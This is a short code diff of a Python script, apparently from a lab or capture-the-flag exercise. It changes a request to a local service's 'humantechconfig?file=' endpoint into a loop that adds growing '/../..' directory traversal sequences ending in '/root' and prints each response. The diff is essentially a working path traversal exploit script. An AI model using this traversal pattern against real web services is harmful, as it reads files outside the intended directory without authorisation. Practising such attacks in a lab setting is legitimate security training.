@@ -9,9 +9,13 @@
 # down your search
 
 
-
 import urllib.request as requests
-url = "http:/127.0.0.1:8082/humantechconfig?file=human.conf"
-req = requests.urlopen(url)
-print(req.read())
+url = "http://127.0.0.1:8082/humantechconfig?file=human.conf"
 
+traversal = "/../.."
+
+for i in range(10):
+  req = requests.urlopen(url + str(traversal * i) + "/root")
+  print ("Site: ", (url + str(traversal * i) + "/root"))
+  print(req.read())
+  
